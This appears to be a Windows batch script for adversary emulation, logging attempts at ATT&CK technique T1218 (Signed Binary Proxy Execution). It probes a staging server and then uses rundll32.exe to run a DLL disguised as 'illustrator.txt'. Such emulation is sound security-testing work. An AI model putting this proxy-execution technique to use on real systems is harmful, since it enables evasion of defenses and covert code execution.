@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM Random constant names with PHR_ as values
SET douyiw=
SET ovbdjs=https://10.0.0.49
SET frytcn=https://10.0.0.49/stage/2/icon.png?7594-10
SET eykalkg=BALAM-S2B
SET fkesh=10
SET ecrfwq=illustrator.txt
SET rgnpbq=7594

REM Generated variables
SET uioytq=%APPDATA%\!fkesh!\macula-simulations.log
SET kjhglp=%WINDIR%\System32\rundll32.exe
SET xcvbns=T1218
SET plokij=Signed Binary Proxy Execution

REM Step 1: Check server availability
curl -k -s -o nul "!frytcn!"
IF !ERRORLEVEL! NEQ 0 (
    SET mnhgfd=0
    SET werfdg=connection_refused
) ELSE (
    SET mnhgfd=1
    SET werfdg=
)

REM Build timestamp
FOR /F "tokens=2 delims==" %%I IN ('wmic os get localdatetime /value') DO SET jklpoi=%%I
SET yyyymmdd=!jklpoi:~0,4!-!jklpoi:~4,2!-!jklpoi:~6,2!
SET hhmmss=!jklpoi:~8,2!:!jklpoi:~10,2!:!jklpoi:~12,2!.!jklpoi:~15,3!

REM Log TTP for heartbeat check
ECHO [!yyyymmdd! !hhmmss!][!eykalkg!]: !fkesh!-!rgnpbq!-!xcvbns!|!plokij!=!mnhgfd!:!werfdg!>>"!uioytq!" 2>nul || >nul

REM Step 2 & 3: Change to output dir and execute DLL
SET mnhgfd=0
SET werfdg=
CD /D "!douyiw!" 2>nul
IF !ERRORLEVEL! EQU 0 (
    "!kjhglp!" "!ecrfwq!",DllMain 2>nul
    IF !ERRORLEVEL! EQU 0 (
        SET mnhgfd=1
    ) ELSE (
        SET werfdg=execution_failed
    )
) ELSE (
    SET werfdg=directory_not_found
)

REM Log TTP for DLL execution
ECHO [!yyyymmdd! !hhmmss!][!eykalkg!]: !fkesh!-!rgnpbq!-!xcvbns!|!plokij!=!mnhgfd!:!werfdg!>>"!uioytq!" 2>nul || >nul